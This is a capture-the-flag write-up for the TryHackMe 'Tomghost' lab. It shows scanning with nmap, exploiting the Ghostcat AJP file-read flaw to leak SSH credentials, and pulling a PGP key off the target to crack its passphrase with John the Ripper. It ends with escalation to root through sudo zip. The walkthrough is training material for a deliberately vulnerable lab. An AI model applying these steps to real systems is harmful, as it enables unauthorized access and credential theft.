# Tomghost

- **Challenge Link:**
  [https://tryhackme.com/room/tomghost](https://tryhackme.com/room/tomghost)
- **Author:** [stuxnet](https://tryhackme.com/p/stuxnet)
- **Difficulty Level:** Easy

## Enumeration

To begin, scan the target IP address with nmap to determine open ports and
services:

```
$ nmap -sV <machine IP>
...
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see the following services running:

- **Port 22**: SSH for secure remote login
- **Port 8009**: Apache Jserv allows Apache to talk to Tomcat (more on this
  later)
- **Port 8080:** Apache Tomcat for running enterprise Java applications. 

## Apache Jserv 

I was not familiar with Apache Jserv, so I Googled it. Essentially, it is a
service that allows Apache to host static content like usual, and then proxies
Tomcat related content to the Tomcat service. 

The service is running on the expected port 8009, however it is not normally
open to the world. 

## Ghostcat

After some more Googling, I found an excellent post on
[pen testing the Apache Jserv
protocol](https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp)
from hacktricks.xyz.

Since port 8009 is expose, the server is susceptible to a restricted LFI
vulnerability referred to as "Ghostcat". We can read files like
`WEB-INF/web.xml`
which can leak important information like credentials for the Tomcat interface,
depending on the server setup

Here is a Python implementation of the [exploit](https://www.exploit-db.com/exploits/48143)

Run it to leak the credentials to the SSH server.

```
$ python ghostcat.py <machine IP>
```

## Inital Access

Use the leaked credentials to log into the SSH server. From there, the user.txt
flag can be found at /home/merlin/user.txt:

```
skyfuck@ubuntu:~$ cat /home/merlin/user.txt
REDACTED-FLAG
```

## Privilege Escalation

Perform a directory listing on the skyfuck user's home directory:

```
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

credential.pgp likely contains credentials for an admin user, but it is encoded
with PGP and cannot be read yet. 

tryhackme.asc is a private PGP private key that can be used to decrypt the
credential.pgp file!

To start, let's load in the private key to memory:

```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc
```

And now decrypt the credential file:

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
Enter passphrase:
```

Darn! The file is passphrase protected! Time to crack it.

## Cracking PGP

There are probably several ways to do this, but the most immediate idea I had
was to download the file to my local Kali box and use John The Ripper (JTR).

1. On the target, start a Python web server

```
skyfuck@ubuntu:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
```

2. On the local machine, download the tryhackme.asc file

```
$ wget http://<machine IP>:8000/tryhackme.asc
```

3. Translate the .asc file into a format that JTR can understand

```
$ pgp2john tryhackme.asc > forjohn
```

4. Crack that passphrase!

```
$ john forjohn --wordlist=/usr/share/wordlists/rockyou.txt
```

Back on the target, use the cracked passphrase to access the credential.pgp
file.

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp --output credential.txt
skyfuck@ubuntu:~$ cat credential.txt
merlin:REDACTE-PASSWORD
```

Nice! We have the password for the merlin user! 

## Privilege Escalation

Switch to the other user and see what privileges they have on the system.

```
skyfuck@ubuntu:~$ su merlin
Password:                                                                                                                                                             
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:                                                                                                                       
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Interesting, we can run /usr/bin/zip with no password as the root user. 

Make a zip file of the flag file root.txt

```
merlin@ubuntu:~$ sudo /usr/bin/zip ./flag.zip /root/root.txt
 adding: root/root.txt (stored 0%)

merlin@ubuntu:~$ unzip flag.zip
Archive:  flag.zip  
 extracting: root/root.txt

merlin@ubuntu:~$ cat root/root.txt
REDACTED-FLAG
```

## Lessons Learned
1. Apache Jserv on port 8009 should not be publicly accessible! [DiabloHorn has
a good post on
this](https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/)
2. Credentials should never be hardcoded into a website's source code!
